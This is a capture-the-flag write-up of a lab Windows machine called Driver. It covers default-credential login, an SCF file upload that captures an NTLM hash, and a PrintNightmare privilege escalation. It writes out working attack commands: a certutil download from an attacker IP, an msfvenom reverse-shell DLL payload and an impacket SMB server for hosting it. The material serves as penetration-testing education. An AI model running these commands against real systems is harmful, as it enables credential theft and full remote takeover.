## Enumeration
`nmap -sVC 10.10.11.106`

```bash
Reason: 997 no-responses  
 PORT  STATE SERVICE   REASON     VERSION  
 80/tcp open http     syn-ack ttl 127 Microsoft IIS httpd 10.0  
 | http-auth:   
 | HTTP/1.1 401 Unauthorized\x0D  
 |_ Basic realm=MFP Firmware Update Center. Please enter password for admin  
 | http-methods:   
 |_ Supported Methods: GET HEAD POST OPTIONS  
 |_http-server-header: Microsoft-IIS/10.0  
 |_http-title: Site doesnt have a title (text/html; charset=UTF-8).  
 135/tcp open msrpc    syn-ack ttl 127 Microsoft Windows RPC  
 445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)  
 5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Not Found
 |_http-server-header: Microsoft-HTTPAPI/2.0
 Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Open ports: 80 (IIS httpd 10.0), 135 (RPC), 445 (smb), 5985 (winrm)

## HTTP
The web service prompts for HTTP basic authentication. These prompts are often misconfigured to default creds `admin:admin`.

After login, we have a printer service and on the Firmware Updates tab we find an upload functionality. There are not filters enforced on the upload and we can upload anything which will be written in a file share. Next we need to find the upload directory. We can start a fuzzer for that.

```bash
ffuf -c -w -H 'Authentication: Basic YWRtaW46YWRtaW4=' /usr/share/wordlists/dirb/big.txt -u http://10.10.11.106/FUZZ -e .php,.zip,.txt,.pdf
```

Because the upload document on a printer service is probably stored on some user's home directory we can use `SCF` files which can be used to perform limited set of commands. For example the “Show Desktop” button is just an SCF file. 

Read more about SCF file attacks [here](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

For this attack we can use responder to capture a hash. First, create a SCF file `test.scf` we the following commands:
```bash
[Shell]
Command=2
IconFile=\\<attack-ip>\share\whatever
[Taskbar]
Command=ToggleDesktop
```

Upload the file on the share. When a user browse the network share Windows will try to authenticate to that share in which point we can capture the NTLM authentication hash.

Run responder and wait `responder -wrf -I tun0`. After a couple seconds we get our hash `tony::DRIVER:NTLM`. This is an NTLMv2 hash which we can crack to reveal the password: `liltony`

## Privilege Escalation
Now we can connect with winrm and the above credentials:

`evil-winrm -u Tony -p liltony -i driver.htb`

If we look to the `fw_up.php` source code we can find where the upload directory is  `c:\firmwares`.

Since there is a printer service, we can try printnightmare CVE-2021-1675 to force ourselves in as SYSTEM. There's a PS module for this [here](https://github.com/calebstewart/CVE-2021-1675)

`certutil.exe -urlcache -f http://10.10.16.2:1234/CVE-2021-1675.ps1 nightmare.ps1`

However, we are unauthorized to execute the scipt. That is because of the current execution policy (Restricted). But we can force the execution policy to Unrestricted.

```powershell
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
```

```powershell
Import-Module ./nightmare.ps1
Invoke-Nightmare
```

Alternative there’s a Python version of this we can run from Kali [here](https://github.com/cube0x0/CVE-2021-1675)

As a prerequisite we need a malicious dll payload that will send us a remote shell. The Python script will inject this into the Print Spooler:

`msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST LPORT=4444 -f dll -o test.dll`

The file we end up creating here needs to be hosted somewhere and the easiest approach is a samba server.

`impacket-smbserver share . -smb2support`